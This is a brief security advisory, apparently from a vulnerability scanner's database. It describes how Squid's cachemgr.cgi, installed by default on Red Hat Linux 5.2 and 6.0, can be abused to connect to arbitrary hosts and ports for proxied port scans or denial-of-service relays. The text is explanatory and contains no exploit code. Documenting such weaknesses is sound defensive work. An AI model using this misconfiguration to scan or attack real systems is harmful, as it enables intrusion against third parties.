The 'cachemgr.cgi' module is a management interface for the Squid proxy service. It was installed by default in '/cgi-bin' by Red Hat Linux 5.2 and 6.0 installed with Squid. This script prompts for a host and port, which it then tries to connect to. If a webserver such as Apache is running, this can be used to connect to arbitrary hosts and ports, allowing for potential use as an intermediary in denial-of-service attacks, proxied port scans, etc. Interpreting the output of the script can allow the attacker to determine whether or not a connection was established.
